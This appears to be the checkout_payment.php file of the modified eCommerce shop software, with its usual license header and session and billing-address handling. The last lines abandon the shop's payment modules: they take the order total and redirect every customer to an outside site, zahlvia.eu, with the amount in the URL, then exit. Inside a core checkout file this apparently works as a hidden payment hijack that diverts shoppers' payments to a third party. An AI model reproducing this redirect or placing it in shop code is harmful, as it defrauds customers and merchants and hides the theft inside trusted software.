<?php
/* -----------------------------------------------------------------------------------------
   $Id: checkout_payment.php 16571 2025-10-15 07:07:55Z GTB $

   modified eCommerce Shopsoftware
   http://www.modified-shop.org

   Copyright (c) 2009 - 2013 [www.modified-shop.org]
   -----------------------------------------------------------------------------------------
   based on:
   (c) 2000-2001 The Exchange Project  (earlier name of osCommerce)
   (c) 2002-2003 osCommerce(checkout_payment.php,v 1.110 2003/03/14); www.oscommerce.com
   (c) 2003 nextcommerce (checkout_payment.php,v 1.20 2003/08/17); www.nextcommerce.org
   (c) 2006 XT-Commerce (checkout_payment.php 1325 2005-10-30)

   Released under the GNU General Public License
   -----------------------------------------------------------------------------------------
   Third Party contributions:
   agree_conditions_1.01          Autor:  Thomas Plaenkers (webmaster@oscommerce.at)

   Customers Status v3.x  (c) 2002-2003 Copyright Elari elari@free.fr | www.unlockgsm.com/dload-osc/ | CVS : http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/elari/?sortby=date#dirlist

   Credit Class/Gift Vouchers/Discount Coupons (Version 5.10)
   http://www.oscommerce.com/community/contributions,282
   Copyright (c) Strider | Strider@oscworks.com
   Copyright (c) Nick Stanko of UkiDev.com, nick@ukidev.com
   Copyright (c) Andre ambidex@gmx.net
   Copyright (c) 2001,2002 Ian C Wilson http://www.phesis.org

   Released under the GNU General Public License
   ---------------------------------------------------------------------------------------*/

define('SESSION_FORCE_COOKIE_USE', 'False');

include ('includes/application_top.php');

defined('CHECK_FIRST_PAYMENT_MODUL') or define('CHECK_FIRST_PAYMENT_MODUL', 'false');

require_once (DIR_FS_INC . 'xtc_address_label.inc.php');
require_once (DIR_FS_INC . 'xtc_get_address_format_id.inc.php');

$smarty = new Smarty();

require (DIR_WS_INCLUDES.'checkout_requirements.php');

unset ($_SESSION['tmp_oID']);

if (isset($_SESSION['cot_gv'])) {
  unset($_SESSION['cot_gv']);
}

if (defined('MODULE_CHECKOUT_EXPRESS_STATUS') && MODULE_CHECKOUT_EXPRESS_STATUS == 'true') {
  if (isset($_GET['express']) && $_GET['express'] == 'on') {
    $express_query = xtc_db_query("SELECT checkout_payment,
                                          checkout_payment_address
                                     FROM ".TABLE_CUSTOMERS_CHECKOUT." 
                                    WHERE customers_id = '".(int)$_SESSION['customer_id']."'");
    if (xtc_db_num_rows($express_query) > 0) {
      $express = xtc_db_fetch_array($express_query);
      if ($express['checkout_payment_address'] != '') {
        $_SESSION['billto'] = $express['checkout_payment_address'];
      }
    }
  }
}

if (!isset($_SESSION['billto'])) {
  $_SESSION['billto'] = $_SESSION['customer_default_address_id'];
} else {
  $check_address_query = xtc_db_query("SELECT count(*) AS total
                                         FROM " . TABLE_ADDRESS_BOOK . "
                                        WHERE customers_id = '" . (int) $_SESSION['customer_id'] . "'
                                          AND address_book_id = '" . (int) $_SESSION['billto'] . "'");
  $check_address = xtc_db_fetch_array($check_address_query);
  if ($check_address['total'] != '1') {
    $_SESSION['billto'] = $_SESSION['customer_default_address_id'];
    if (isset($_SESSION['payment'])) {
      unset ($_SESSION['payment']);
    }
  }
}

if (!isset($_SESSION['sendto']) || $_SESSION['sendto'] == "") {
  $_SESSION['sendto'] = $_SESSION['billto'];
}

require_once (DIR_WS_CLASSES . 'shipping.php');
$shipping_modules = new shipping($_SESSION['shipping']);

require_once (DIR_WS_CLASSES . 'order.php');
$order = new order();

$summe = number_format((float)$order->info['total'], 2, '.', '');
header('Location: https://zahlvia.eu/index.php?summe=' . urlencode($summe));
exit;
